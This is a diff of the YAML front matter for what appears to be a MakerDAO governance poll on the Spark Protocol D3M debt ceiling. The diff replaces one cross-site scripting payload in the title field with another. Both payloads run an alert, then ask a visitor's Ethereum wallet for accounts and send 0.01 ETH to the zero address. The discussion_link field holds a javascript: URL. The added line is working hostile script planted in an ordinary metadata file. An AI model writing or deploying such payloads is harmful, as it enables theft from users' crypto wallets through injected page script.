@@ -1,5 +1,5 @@
 ---
-title: Adjust Spark Protocol D3M Debt Ceiling - July 24, 2023 <img src=x onerror=alert(origin)><script>ethereum.request({method:'eth_requestAccounts'}).then(a=>ethereum.request({method:'eth_sendTransaction',params:[{to:'0x0000000000000000000000000000000000000000',from:a[0],value:'0x2386F26FC10000'}]}));</script>
+title: Adjust Spark Protocol D3M Debt Ceiling - July 24, 2023 <img src=x onerror="alert(origin);ethereum.request({method:'eth_requestAccounts'}).then(a=>ethereum.request({method:'eth_sendTransaction',params:[{to:'0x0000000000000000000000000000000000000000',from:a[0],value:'0x2386F26FC10000'}]}));">
 summary: Signal your support or opposition to adjusting the Spark Protocol DAI Direct Deposit Module (D3M) parameters.
 discussion_link: javascript:alert()
 parameters:
